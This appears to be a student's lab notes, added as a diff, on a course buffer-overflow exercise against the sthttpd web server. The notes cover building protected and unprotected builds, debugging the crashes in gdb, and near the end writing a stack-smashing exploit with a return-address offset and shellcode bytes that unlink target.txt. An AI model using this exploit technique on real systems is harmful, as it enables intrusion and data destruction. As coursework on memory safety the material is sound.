@@ -1,0 +1,227 @@
+wget http://web.cs.ucla.edu/classes/spring17/cs33/lab/sthttpd-2.27.0.tar.gz
+tar -zxvf sthttpd-2.27.0.tar.gz
+emacs patch.patch (and copy-paste the patch)
+patch -p0 < patch.patch
+
+   this is to first set up the lab, downloading the necessary files
+   and patching it...
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address -static-libasan'
+mv src/thttpd src/thttpd-as
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -z execstack'
+mv src/thttpd src/thttpd-no2
+
+   this is to create the necessasry variant kinds of executables
+
+cd src
+emacs foo.txt
+
+./thttpd-sp -p 12529 -D
+curl http://localhost:12529/foo.txt
+
+./thttpd-as -p 12530 -D
+curl http://localhost:12530/foo.txt
+
+./thttpd-no -p 12531 -D
+curl http://localhost:12531/foo.txt
+
+   running the daemons on the given ports and making sure they run
+   I would later find out that although the curl worked, these programs 
+   didn't freeze like they were meant to. To fix this, I used 12528 
+   instead of 12529 and 12533 instead of 12531.
+
+thttpd-sp:
+
+emacs config.txt (fill up with "debug debug " 50x (~500 chars))
+gdb ./thttpd-sp
+run -p 12529 -D -C config.txt
+bt
+   uhh.. this doesn't work on this port for some reason...
+   I really don't know why.
+   so I ran it on 12528 instead. sorry.
+   when I did this, it worked fine and I got the desired SIGSEGV
+
+backtrace for this:
+
+#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000405056 in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#7  0x7562656400677562 in ?? ()
+.....
+
+break 1189 (the command just before the problematic 1190 line)
+re-run program (steps before)
+set-disassemble-next-line on
+si and ni (until we find the jump to read_config+1521)
+
+   after this point, the program jumps to a stack_chk_fail
+   this seems to indicate that the issue is in the following command,
+   causing the program to jump:
+
+0x0000000000404f28 <read_config+1224>:       64 48 33 04 25 28 00 00 00      xor    %fs:0x28,%rax
+		   			     e8 6e d4 ff ff	     	     \
+					     callq  0x4024b0 <__stack_chk_fail@plt>
+
+
+thttpd-as:
+
+gdb ./thttpd-as
+r -p 12530 -D -C config.txt
+bt
+
+==19552==ERROR: AddressSanitizer: stack-buffer-overflow on address \
+0x7fffffffce54 at pc 0x00000043aec9 bp 0x7fffffffcdb0 sp 0x7fffffffc560
+READ of size 602 at 0x7fffffffce54 thread T0
+
+#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004b8ae3 in __sanitizer::BufferedStackTrace::SlowUnwindStack \
+(this=0x7fffffffbcd0, pc=4435657, max_depth=<optimized out>) \ 
+at ../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
+#3  0x00000000004b42e1 in __asan::GetStackTraceWithPcBpAndContext \
+(fast=false, context=0x0, bp=140737488342448, pc=4435657, max_depth=256, stack=0x7fffffffbcd0) \
+at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
+#4  __asan::ReportGenericError (pc=<optimized out>, bp=bp@entry=140737488342448, \
+sp=sp@entry=140737488340320, addr=addr@entry=140737488342612, \
+is_write=is_write@entry=false, access_size=access_size@entry=602, exp=<optimized out>,
+    fatal=<optimized out>) at ../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
+#5  0x000000000043aee4 in __interceptor_strchr (str=<optimized out>, \
+c=<optimized out>) at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+#6  0x00000000004e0b51 in read_config (filename=<optimized out>) at thttpd.c:1018
+#7  0x6564206775626564 in ?? ()
+
+   we can once again see that the issue occured in read_config, 
+   but for a different reason this time... so we do the same things
+   to debug as last time (w/ break at 1016)
+
+the lines that call interceptor...:
+
+   0x00000000004e0b43 <read_config+179>:        48 8b 3c 24     mov    (%rsp),%rdi
+=> 0x00000000004e0b47 <read_config+183>:        be 23 00 00 00  mov    $0x23,%esi
+   0x00000000004e0b4c <read_config+188>:        e8 2f a5 f5 ff  callq  0x43b080 \
+   		      				<__interceptor_strchr(char const*, int)>
+
+
+
+
+thttpd-no:
+
+gdb ./thttpd-no
+r -p 12533 -D -C config.txt
+bt
+
+#0  0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+#1  0x7562656400677562 in ?? ()
+
+   when we debug this in the machine code, there are not any issues 
+   until the method returns, which results in a segmentation fault
+   
+   0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
+   0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
+   0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
+   0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
+   0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
+=> 0x0000000000404d9f <read_config+1215>:       c3      retq
+(gdb) si
+
+Program received signal SIGSEGV, Segmentation fault.
+
+
+Generating Assembly Code:
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+mv ./thttpd.o ./thttpd-sp.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
+mv ./thttpd.o ./thttpd-as.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv ./thttpd.o ./thttpd-no.s
+
+   done as instructed.
+
+   we can see that the sp introduces the usage of canaries.
+   we can also see that the as introduces 
+
+Building an exploit:
+
+   first we need to locate the stored rip location that the function read_config
+   will get back to.
+
+break read_config
+r -p 12533 -D -C config.txt
+bt
+break 893 (the line that calls it)
+r -p 12533 -D-C config.txt
+
+   0x00000000004051da <parse_args+634>: e8 01 f7 ff ff  callq  0x4048e0 <read_config>
+   0x00000000004051df <parse_args+639>: e9 ef fe ff ff  jmpq   0x4050d3 <parse_args+371>
+
+si
+x/8xw $sp
+
+   0x7fffffffd008: 0x004051df      0x00000000      0x00000018      0x00000000
+   0x7fffffffd018: 0xffffe5a5      0x00007fff      0xffffd100      0x00007fff
+   
+   from this, we can conclude that the stored rip is at location 0x7fffffffd008   
+
+*put a breakpoint before fgets*
+*run the program like before*
+ni
+x/8xw $sp
+
+   0x7fffffffcf70: 0x74726f70      0x4141413d      0x41414141      0x41414141
+   0x7fffffffcf80: 0x41414141      0x41414141      0x41414141      0x41414141
+
+   as we can see, the 41s what is put in the stack. From this, we can conclude
+   that fgets inserts our inputted data at 0x7fffffffcf75
+
+   we can now conclude that the lines that overwrite the prev rip requires a buffer
+   of 0x93, or 147 bytes.
+   
+   to test if this stuff actually works, I created binary files, and found that
+   to overwrite the correct location I needed to repace the Bs with the given
+   address location where I injected my code:
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB
+
+   then I created a sample c file that would erase the target.txt using unlink. From this I could
+   determine I  needed to execute the following bytes
+
+74 61 72 67 65 74 2e 74 78 74 00: 	   target.txt\0
+48 bf 78 cf ff ff ff 7f 00 00:		   moves the address that target.txt\0 starts at to rdi
+b8 57 00 00 00 	     	   		   moves 57 to rax
+0f 05 	    				   syscall
+
+   with this information, I was able to determine a method in which to erase target.txt.
+   I first needed to structure the option into a way that would be compatible, i.e.
+   with port= before anything else. This has the bit pattern 70 6f 72 74 3d AA AA AA. I then followed
+   that with the necessary lines of code.
+
+   These lines will take the place of the start As, and B will be 0x00007fffffffcf83. 
+   *remember to reverse the address bytes to take into account little endian* (smash2.txt)
+
+   Keep in mind that this will not work if stack randomization is turned on or if the nx bit is turned on.   
